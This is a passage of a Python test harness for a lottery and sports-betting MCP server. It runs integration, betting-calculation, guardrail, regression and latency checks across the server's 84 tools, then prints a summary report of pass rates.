            stats.record(consistent, 0, "Cross-module inconsistency")
            print(f"  {'✓' if consistent else '✗'} analyze_match_plays ↔ recommend_best_play consistency")
        except:
            stats.record(False, 0, "JSON parse error in cross-module")
            print(f"  ✗ JSON parse error")

    # 6d: Data fetch → analysis → prediction chain
    print("\n  --- 6d: Data→Analysis→Prediction Chain ---")
    chain_tools = [
        ('lottery_fetch_today_matches', {'lottery_type': '竞彩足球', 'limit': 1, 'include_odds': False}),
        ('lottery_get_match_features', {'match_id': VALID_MATCH, 'limit': 5}),
        ('lottery_analyze_match', {'match_id': VALID_MATCH, 'league': '英超'}),
        ('lottery_predict_with_model', {'match_id': VALID_MATCH}),
        ('lottery_advanced_play_analysis', {'match_id': VALID_MATCH}),
        ('lottery_generate_betting_slips', {'match_id': VALID_MATCH}),
    ]
    for name, params in chain_tools:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name}: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s")

    # 6e: Rules → constraint enforcement chain
    print("\n  --- 6e: Rules → Constraints Chain ---")
    rule_chain = [
        ('lottery_query_rules', {'rule_code': 'SPF'}),
        ('lottery_explain_rule', {'rule_code': 'SPF'}),
        ('lottery_rule_guard', {'action': 'check', 'rule': 'C001'}),
        ('lottery_enforce_constraints', {'bet_proposal': json.dumps({'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100}], 'total_stake': 100})}),
    ]
    for name, params in rule_chain:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name}: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s")

    print(f"\n  STATS: {stats.summary()}")
    return stats


# =================================================================
# DIMENSION 7: HISTORY & BETTING & GUARDRAILS (EXPANDED)
# =================================================================
async def test_dim7_history_betting_guardrails():
    print("\n" + "=" * 80)
    print("DIMENSION 7: 历史数据 & 投注计算 & 守卫全覆盖 (扩展)")
    print("=" * 80)

    stats = TestStats()

    # 7a: All history tools
    print("\n  --- 7a: History Tools (7 tools) ---")
    history_tools = [
        'lottery_get_historical_data_summary',
        'lottery_query_history',
        'lottery_search_historical_matches',
        'lottery_historical_analysis',
        'lottery_analyze_results',
        'lottery_verify_results',
        'lottery_get_odds_history',
    ]
    for name in history_tools:
        params = PARAM_MAP.get(name, {})
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name}: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s")

    # 7b: All betting calculation tools
    print("\n  --- 7b: Betting Calculation Tools ---")
    betting_tools = [
        ('lottery_calculate_bonus', {'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.5, 'stake': 100}], 'parlay_type': '1c1'}),
        ('lottery_validate_bet', {'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100}),
        ('lottery_validate_parlay', {'bets': [
            {'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0},
            {'match_id': 'M002', 'play_type': 'SPF', 'selection': '主胜', 'odds': 1.8}
        ], 'parlay_type': '2c1'}),
        ('lottery_validate_plan', {'bet_id': 'PLAN001'}),
        ('lottery_generate_betting_slips', {'match_id': VALID_MATCH}),
        ('lottery_generate_kelly_slips', {'match_id': VALID_MATCH}),
        ('lottery_optimize_stakes', {'match_id': VALID_MATCH}),
        ('lottery_simulate_scenarios', {'match_id': VALID_MATCH}),
        ('lottery_smart_parlay', {}),
        ('lottery_analyze_mixed_parlay', {}),
    ]
    for name, params in betting_tools:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name}: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s")

    # 7c: All guardrails tools
    print("\n  --- 7c: Guardrails/Enforcement Tools ---")
    guard_tools = [
        ('lottery_enforce_constraints', {'bet_proposal': json.dumps({'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100}], 'total_stake': 100})}),
        ('lottery_check_bankroll_health', {'bankroll': 5000, 'initial_bankroll': 10000}),
        ('lottery_check_match_deadline', {'match_time': '2026-12-31T20:00:00'}),
        ('lottery_should_stop_betting', {}),
        ('lottery_check_risk_status', {}),
        ('lottery_comprehensive_risk_assessment', {'planned_bet_amount': 100, 'lottery_type': '竞彩足球'}),
        ('lottery_assess_risk', {'match_id': VALID_MATCH}),
        ('lottery_validate_scenario', {'scenario_id': 'TEST001'}),
        ('lottery_find_value_bets', {'match_id': VALID_MATCH}),
        ('lottery_monitor_odds', {'match_id': VALID_MATCH}),
        ('lottery_track_odds_changes', {'match_id': VALID_MATCH}),
        ('lottery_quantify_injury_impact', {'match_id': VALID_MATCH}),
        ('lottery_reject', {'reason': '测试拒绝'}),
        ('lottery_rule_guard', {'action': 'check', 'rule': 'C001'}),
    ]
    for name, params in guard_tools:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name}: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s")

    # 7d: Bankroll health edge cases
    print("\n  --- 7d: Bankroll Health Edge Cases ---")
    bankroll_tests = [
        {'bankroll': 10000, 'initial_bankroll': 10000},  # no loss
        {'bankroll': 5000, 'initial_bankroll': 10000, 'daily_pnl': -500},  # 50% drawdown
        {'bankroll': 2000, 'initial_bankroll': 10000, 'consecutive_losses': 5},  # 80% drawdown + streak
        {'bankroll': 50000, 'initial_bankroll': 10000, 'daily_pnl': 5000, 'weekly_pnl': 20000},  # large profit
    ]
    for params in bankroll_tests:
        status, elapsed, result = await call_tool('lottery_check_bankroll_health', params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"bankroll_health: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} bankroll_health bankroll={params['bankroll']}: {elapsed:.3f}s")

    print(f"\n  STATS: {stats.summary()}")
    return stats


# =================================================================
# DIMENSION 8: REGRESSION & FINAL
# =================================================================
async def test_dim8_regression():
    print("\n" + "=" * 80)
    print("DIMENSION 8: 回归测试 & 修复验证")
    print("=" * 80)

    stats = TestStats()

    # 8a: Verify all previously fixed bugs
    print("\n  --- 8a: Regression Checks (Round 1 fixes) ---")
    checks = [
        ('lottery_fetch_today_matches', {'lottery_type': '竞彩足球', 'limit': 1, 'include_odds': False}, 'async wrapper'),
        ('lottery_get_match_info', {'match_id': VALID_MATCH}, 'closure fix'),
        ('lottery_get_match_features', {'match_id': VALID_MATCH, 'limit': 5}, 'closure fix'),
        ('lottery_get_jingcai_h2h', {'match_id': VALID_MATCH, 'limit': 5}, 'closure fix'),
        ('lottery_get_match_standings', {'match_id': VALID_MATCH}, 'closure fix'),
        ('lottery_get_recent_form', {'match_id': VALID_MATCH, 'limit': 5}, 'closure fix'),
        ('lottery_get_future_matches', {'match_id': VALID_MATCH, 'limit': 3}, 'closure fix'),
        ('lottery_get_players', {'match_id': VALID_MATCH, 'limit': 3}, 'closure fix'),
        ('lottery_get_injury_suspension', {'match_id': VALID_MATCH}, 'closure fix'),
        ('lottery_strategy_backtest', {}, 'backtest framework'),
        ('lottery_analyze_match', {'match_id': VALID_MATCH, 'league': '英超'}, 'await fix'),
        ('lottery_predict_with_model', {'match_id': VALID_MATCH}, 'await fix'),
        ('lottery_advanced_play_analysis', {'match_id': VALID_MATCH}, 'datetime fix'),
        ('lottery_historical_analysis', {'match_id': VALID_MATCH}, 'datetime fix'),
        ('lottery_generate_prediction_report', {}, 'datetime fix'),
        ('lottery_recommend_best_play', {'match_id': VALID_MATCH, 'play_types': ['SPF', 'BF']}, 'datetime fix'),
        ('lottery_analyze_local_odds_trend', {'match_id': VALID_MATCH}, 'Path import fix'),
        ('lottery_get_local_odds_history', {'match_id': VALID_MATCH}, 'Path import fix'),
        ('lottery_list_local_odds_matches', {}, 'Path import fix'),
    ]
    for name, params, desc in checks:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name} ({desc}): {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {desc}: {elapsed:.3f}s")

    # 8b: Run unit tests
    print("\n  --- 8b: Unit Test Suite ---")
    import subprocess
    result = subprocess.run(['python', '-m', 'pytest', 'tests/', '-x', '-q', '--tb=short'],
                          capture_output=True, text=True, cwd='/workspace')
    test_ok = result.returncode == 0
    print(f"  {'✓' if test_ok else '✗'} Unit tests: {result.stdout.strip()[-80:] if result.stdout else 'N/A'}")

    # 8c: Verify tool count stability
    print("\n  --- 8c: Tool Count Stability ---")
    expected_count = 84
    actual_count = len(tools)
    count_ok = actual_count == expected_count
    print(f"  {'✓' if count_ok else '✗'} Tool count: {actual_count} (expected {expected_count})")

    print(f"\n  STATS: {stats.summary()}")
    return stats


# =================================================================
# DIMENSION 9: DEEP DIMENSION (新增深度维度)
# =================================================================
async def test_dim9_deep_analysis():
    print("\n" + "=" * 80)
    print("DIMENSION 9: 深度分析维度 (新增)")
    print("=" * 80)

    stats = TestStats()

    # 9a: Response size analysis
    print("\n  --- 9a: Response Size Analysis ---")
    size_tools = [
        ('lottery_fetch_today_matches', {'lottery_type': '竞彩足球', 'limit': 5, 'include_odds': True}),
        ('lottery_analyze_with_pipeline', {}),
        ('lottery_full_analysis_and_betting', {'bankroll': 5000, 'max_matches': 2, 'strategy': 'conservative'}),
        ('lottery_complete_ml_analysis', {}),
        ('lottery_strategy_backtest', {}),
        ('lottery_advanced_enhancements', {}),
    ]
    for name, params in size_tools:
        status, elapsed, result = await call_tool(name, params)
        size_kb = len(result) / 1024
        ok = status == 'ok' and size_kb > 0.1
        stats.record(ok, elapsed, f"{name}: size={size_kb:.1f}KB")
        print(f"  {'✓' if ok else '✗'} [{name}] {size_kb:.1f}KB {elapsed:.3f}s")

    # 9b: Error message quality
    print("\n  --- 9b: Error Message Quality ---")
    error_tests = [
        ('lottery_analyze_match', {'match_id': INVALID_MATCH}),
        ('lottery_advisor_analysis', {'match_id': INVALID_MATCH}),
        ('lottery_get_match_info', {'match_id': INVALID_MATCH}),
        ('lottery_predict_with_model', {'match_id': INVALID_MATCH}),
        ('lottery_validate_bet', {'match_id': 'M001', 'play_type': 'INVALID', 'selection': '主胜', 'odds': 2.0, 'stake': 100}),
        ('lottery_enforce_constraints', {'bet_proposal': 'INVALID JSON'}),
    ]
    for name, params in error_tests:
        status, elapsed, result = await call_tool(name, params)
        has_error_msg = status == 'ok' or ('error' in result.lower() or 'fail' in result.lower() or 'invalid' in result.lower())
        # Even if it's an error, as long as we get a meaningful message, it's OK
        ok = has_error_msg
        stats.record(ok, elapsed, f"{name}: {result[:100]}")
        print(f"  {'✓' if ok else '✗'} [{name}] error_quality: {elapsed:.3f}s")

    # 9c: Latency distribution
    print("\n  --- 9c: Latency Distribution ---")
    latencies = []
    fast_tools = ['lottery_query_rules', 'lottery_explain_rule', 'lottery_get_system_status',
                  'lottery_manage_config', 'lottery_search_league', 'lottery_get_team_stats']
    for name in fast_tools:
        params = PARAM_MAP.get(name, {})
        status, elapsed, result = await call_tool(name, params)
        if status == 'ok':
            latencies.append(elapsed)
    if latencies:
        avg_lat = sum(latencies) / len(latencies)
        max_lat = max(latencies)
        min_lat = min(latencies)
        print(f"  Fast tools: avg={avg_lat*1000:.1f}ms min={min_lat*1000:.1f}ms max={max_lat*1000:.1f}ms")

    # 9d: Check for tool name collision / duplication
    print("\n  --- 9d: Tool Name Uniqueness ---")
    names = list(tools.keys())
    duplicates = len(names) - len(set(names))
    print(f"  {'✓' if duplicates == 0 else '✗'} No duplicate tool names: {len(names)} unique")

    # 9e: Check all tools have proper name prefixes
    print("\n  --- 9e: Tool Naming Convention ---")
    bad_names = [n for n in names if not n.startswith('lottery_')]
    if bad_names:
        print(f"  ✗ Non-standard names: {bad_names}")
    else:
        print(f"  ✓ All 84 tools follow 'lottery_' naming convention")

    print(f"\n  STATS: {stats.summary()}")
    return stats


# =================================================================
# MAIN
# =================================================================
async def main():
    print("=" * 80)
    print("LOTTERY MCP 多维度全面测试 v2")
    print(f"测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"工具总数: {len(tools)} | 资源总数: {len(resources)} | 提示总数: {len(prompts)}")
    print("=" * 80)

    all_stats = {}

    dims = [
        ('d1', test_dim1_all_tools),
        ('d2r', lambda: test_dim2_resources_prompts()),
        ('d3', test_dim3_edge_cases),
        ('d4', test_dim4_concurrency_perf),
        ('d5', test_dim5_output_schema),
        ('d6', test_dim6_integration),
        ('d7', test_dim7_history_betting_guardrails),
        ('d8', test_dim8_regression),
        ('d9', test_dim9_deep_analysis),
    ]

    for dim_key, dim_func in dims:
        try:
            result = await dim_func()
            if dim_key == 'd2r':
                rstats, pstats = result
                all_stats['d2r'] = rstats
                all_stats['d2p'] = pstats
            else:
                all_stats[dim_key] = result
        except Exception as e:
            print(f"  {dim_key} FAILED: {e}")
            traceback.print_exc()

    # ================================================================
    # FINAL REPORT
    # ================================================================
    print("\n\n")
    print("=" * 80)
    print("FINAL COMPREHENSIVE TEST REPORT")
    print("=" * 80)

    total_all = 0
    passed_all = 0
    failed_all = 0
    dim_latencies = {}

    for dim, stat in sorted(all_stats.items()):
        if stat:
            total_all += stat.total
            passed_all += stat.passed
            failed_all += stat.failed
            if stat.latencies:
                dim_latencies[dim] = sum(stat.latencies) / len(stat.latencies)

    print(f"\n  {'Dimension':<18} {'Tests':>8} {'Passed':>8} {'Failed':>8} {'Rate':>8} {'AvgLat':>10}")
    print(f"  {'-'*18} {'-'*8} {'-'*8} {'-'*8} {'-'*8} {'-'*10}")
    dim_names = {
        'd1': '1.Tools Exhaustive', 'd2r': '2.Resources', 'd2p': '2.Prompts',
        'd3': '3.Edge Cases', 'd4': '4.Concurrency', 'd5': '5.Schema',
        'd6': '6.Integration', 'd7': '7.Hist/Bet/Guard', 'd8': '8.Regression',
        'd9': '9.Deep Analysis'
    }
    for dim, stat in sorted(all_stats.items()):
        if stat:
            rate = f"{stat.passed/stat.total*100:.1f}%" if stat.total else "N/A"
            avg_lat = f"{dim_latencies.get(dim, 0)*1000:.1f}ms" if dim in dim_latencies else "N/A"
            dim_name = dim_names.get(dim, dim)
            print(f"  {dim_name:<18} {stat.total:>8} {stat.passed:>8} {stat.failed:>8} {rate:>8} {avg_lat:>10}")

    total_rate = f"{passed_all/total_all*100:.1f}%" if total_all else "N/A"
    print(f"  {'-'*18} {'-'*8} {'-'*8} {'-'*8} {'-'*8} {'-'*10}")
    print(f"  {'TOTAL':<18} {total_all:>8} {passed_all:>8} {failed_all:>8} {total_rate:>8}")

    # Failures breakdown
    all_errors = []
    for dim, stat in sorted(all_stats.items()):
        if stat and stat.errors:
            all_errors.extend([(dim, e) for e in stat.errors])

    if all_errors:
        print(f"\n  FAILURES ({len(all_errors)}):")
        for dim, err in all_errors[:30]:
            dim_name = dim_names.get(dim, dim)
            print(f"    [{dim_name}] {err[:150]}")
        if len(all_errors) > 30:
            print(f"    ... and {len(all_errors) - 30} more")

    # Health status
    if total_rate and total_rate != 'N/A':
        rate_val = float(total_rate.strip('%'))
        if rate_val >= 95:
            print(f"\n  STATUS: 🟢 HEALTHY ({total_rate})")
        elif rate_val >= 80:
            print(f"\n  STATUS: 🟡 DEGRADED ({total_rate})")
        else:
            print(f"\n  STATUS: 🔴 CRITICAL ({total_rate})")
    else:
        print(f"\n  STATUS: ⚪ UNKNOWN ({total_rate})")

    print("=" * 80)

if __name__ == '__main__':
    asyncio.run(main())